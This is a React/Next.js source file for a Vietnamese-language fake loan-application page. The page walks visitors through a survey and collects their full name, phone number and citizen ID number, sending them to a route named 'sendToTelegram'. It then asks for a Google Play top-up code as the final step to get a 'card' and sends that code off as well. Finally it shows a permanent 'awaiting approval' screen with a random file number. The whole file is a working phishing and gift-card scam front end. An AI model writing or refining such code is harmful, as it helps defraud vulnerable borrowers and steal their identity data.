'use client';
import Image from 'next/image';
import { use, useEffect, useState } from 'react';
import { questions } from '../contants/question';
import bgBank from '../assets/bg-bank-opacity.png';
import clockWait from '../assets/clock-wait.png';
import { set, useForm } from 'react-hook-form';

export default function SurveyForm() {
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors },
  } = useForm();

  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [answers, setAnswers] = useState({});

  const [tab, setTab] = useState(1);
  const [isFinished, setIsFinished] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  // mã hồ sơ
  const [maHoSo, setMaHoSo] = useState('');

  useEffect(() => {
    // kiểm tra trong localStorage có dữ liệu không
    const checkMaHoSo = async () => {
      const maHS = localStorage.getItem('maHoso');
      console.log(maHS);
      // nếu chưa có thì random 1 mã hồ sơ có 6 chữ số
      if (!maHS) {
        const maHoso = Math.floor(100000 + Math.random() * 900000);
        localStorage.setItem('maHoso', maHoso);
        setMaHoSo(maHoso);
      } else {
        setMaHoSo(maHS);
      }
    };
    checkMaHoSo();
  }, []);

  const handleAnswer = (name, value) => {
    // setAnswers([...answers, { questionId: questions[currentQuestion].id, answerIndex }]);
    setAnswers({ ...answers, [name]: value });

    if (currentQuestion + 1 < questions.length) {
      setCurrentQuestion(currentQuestion + 1);
    } else {
      // setIsFinished(true);
    }
  };

  const handleSubmitForm = async () => {
    console.log(answers);
    setIsFinished(true);

    setIsLoading(true);

    try {
      const response = await fetch('/api/sendToTelegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          hoTen: answers.hoTen,
          phone: answers.phone,
          soCCCD: answers.soCCCD,
        }),
      });
      console.log(response);
    } catch (error) {
      console.log('error', error);
    }

    setIsLoading(false);
  };

  const onSubmitNapThe = async () => {
    console.log('Nạp thẻ thành công');
    setTab(2);

    setIsLoading(true);
    try {
      const response = await fetch('/api/sendMaNapGoogle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          maNap: watch('googlePlayCode'),
        }),
      });
      console.log(response);
    } catch (error) {
      console.log('error', error);
    }
    setIsLoading(false);
  };

  return (
    <div className='relative flex-auto flex items-start justify-center bg-gray-100 px-4 py-4 mt-8' style={{}}>
      <div
        className='absolute inset-0'
        style={{
          zIndex: 0,
        }}
      >
        <Image
          src={bgBank.src}
          style={{
            zIndex: 0,
          }}
          alt='bg'
          layout='fill'
          objectFit='cover'
          objectPosition='center'
        />
      </div>

      <div className='bg-white shadow-lg rounded-lg p-6 max-w-3xl w-full' style={{ zIndex: 1 }}>
        {tab === 0 && (
          <div>
            <div className='text-center text-xl font-semibold text-blue-900 mb-6 mt-0'>Tình trạng hồ sơ của bạn</div>

            <div className='flex items-center justify-center'>
              <label className='text-md font-semibold text-gray-700 pr-4'>Nhập mã hồ sơ</label>

              <input type='text' className='flex-1 text-left text-lg px-3 py-1 border rounded-lg font-semibold' style={{}} />
              <button className='ml-2 py-2 px-8 bg-blue-500 text-md text-white font-semibold rounded-xl hover:bg-blue-600 transition duration-300'>
                Kiểm tra
              </button>
            </div>

            <p className='text-center text-gray-500 text-sm font-normal mt-8'>Tham khảo dịch vụ của chúng tôi!</p>
          </div>
        )}

        {tab === 1 && (
          <>
            {!isFinished ? (
              <>
                <div className='text-center text-md font-semibold text-gray-900 mb-0 mt-0 lg:text-lg'>Trả lời câu hỏi để tìm ra gói vay phù hợp</div>

                <h2 className='text-center text-sm font-semibold text-gray-800 mb-4 lg:text-md'>
                  {isFinished ? 'Hoàn thành khảo sát!' : `Câu hỏi ${currentQuestion + 1}/${questions.length}`}
                </h2>

                {/* Thanh tiến trình */}
                <div className='w-full bg-gray-200 h-2 rounded-full mb-4'>
                  <div
                    className='bg-blue-500 h-2 rounded-full transition-all'
                    style={{ width: `${((currentQuestion + 1) / questions.length) * 100}%` }}
                  ></div>
                </div>
                <div className='text-md font-semibold text-gray-900 mb-6 mt-6 lg:text-xl'>{questions[currentQuestion].question}</div>

                <div className='space-y-4'>
                  {/* câu hỏi multiple-choice */}
                  {questions[currentQuestion].type === 'multiple-choice' && (
                    <div className='grid grid-cols-2 gap-2'>
                      {questions[currentQuestion].options.map((option, index) => (
                        <button
                          key={index}
                          onClick={() => handleAnswer(questions[currentQuestion].id, option)}
                          className='py-3 px-4 text-left border rounded-lg bg-gray-100 hover:bg-blue-500 hover:text-white transition duration-300 font-semibold text-base lg:text-base'
                        >
                          {option}
                        </button>
                      ))}
                    </div>
                  )}

                  {/* câu hỏi input */}
                  {questions[currentQuestion].type === 'input' && (
                    <>
                      {questions[currentQuestion].inputs.map((input, index) => (
                        <div key={index}>
                          <label className='block text-gray-700'>{input.label}</label>
                          <input
                            type={input.type}
                            name={input.name}
                            value={answers[input.name] || ''}
                            onChange={(e) => handleAnswer(input.name, e.target.value)}
                            className='w-full mt-1 p-2 border rounded-lg'
                          />
                        </div>
                      ))}
                      <div className='h-2'></div>
                      <button
                        onClick={handleSubmitForm}
                        // nếu chưa nhập 2 input thì disable nút
                        disabled={isLoading || !answers.hoTen || !answers.phone || !answers.soCCCD}
                        style={{ backgroundColor: !answers.hoTen || !answers.phone || !answers.soCCCD ? '#ccc' : '#007bff' }}
                        className='mt-4 w-full py-3 px-4 bg-blue-500 text-white font-semibold rounded-lg hover:bg-blue-600 transition duration-300'
                      >
                        {currentQuestion + 1 < questions.length ? 'Tiếp theo' : 'Hoàn tất'}
                      </button>
                    </>
                  )}
                </div>
              </>
            ) : (
              <form className='text-center text-lg font-semibold text-gray-900 mb-6 mt-6 md:text-xl' onSubmit={handleSubmit(onSubmitNapThe)}>
                <div className='text-center text-base font-semibold text-gray-900 mb-6 mt-0'>
                  Hoàn thành bước cuối cùng để được cấp thẻ!
                </div>
                {/* Thanh tiến trình */}
                <div className='w-full bg-gray-200 h-2 rounded-full mb-4'>
                  <div
                    className='bg-blue-500 h-2 rounded-full transition-all'
                    style={{ width: `${((currentQuestion + 1) / questions.length) * 100}%` }}
                  ></div>
                </div>
                <span> Mã hồ sơ của bạn là: </span>
                <span className='text-blue-500'> {maHoSo} </span>
                <p className='text-gray-500 text-base mt-4'>Nhập mã nạp Google Play của bạn</p>
                <input
                  type='text'
                  className='w-full text-center text-lg mt-1 p-2 border rounded-lg'
                  style={{}}
                  {...register('googlePlayCode', {
                    required: {
                      value: true,
                      message: 'Mã nạp không được để trống',
                    },
                    maxLength: 20,
                    pattern: {
                      value: /^[a-zA-Z0-9]+$/,
                      message: 'Mã nạp không hợp lệ',
                    },
                  })}
                />
                {errors.googlePlayCode && <p className='text-red-500 text-sm font-medium'> {errors.googlePlayCode.message} </p>}

                <button
                  disabled={watch('googlePlayCode') && !errors.googlePlayCode ? false : true}
                  style={{ opacity: watch('googlePlayCode') && !errors.googlePlayCode ? 1 : 0.7 }}
                  className='mt-4 py-2 px-12 bg-blue-500 text-lg text-white font-semibold rounded-full hover:bg-blue-600 transition duration-300'
                  type='submit'
                >
                  Nạp thẻ
                </button>
                <p className='text-gray-500 text-sm font-normal mt-4'>
                  Được bán tại các cửa hàng tiện lợi: Circle K, Family Mart, VinMart, ...
                </p>
              </form>
            )}
          </>
        )}

        {tab === 2 && (
          <div>
            <div className='text-center text-lg font-semibold text-blue-900 mb-0 mt-0 md:text-xl'>Đang chờ phê duyệt</div>
            <Image src={clockWait.src} alt='clock-wait' width={160} height={160} className='mx-auto' />
            <div className='text-center text-lg font-semibold text-gray-900 mb-4 mt-4 md:text-xl'>
              <span> Mã hồ sơ của bạn là: </span>
              <span className='text-blue-500'> {maHoSo} </span>
            </div>
            <div className='text-center text-base font-medium text-gray-900 mb-4 mt-4'>
              <span> Trạng thái hồ sơ: </span>
              <span className='text-blue-900 font-semibold '> Hệ thống đang duyệt hồ sơ của bạn!</span>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
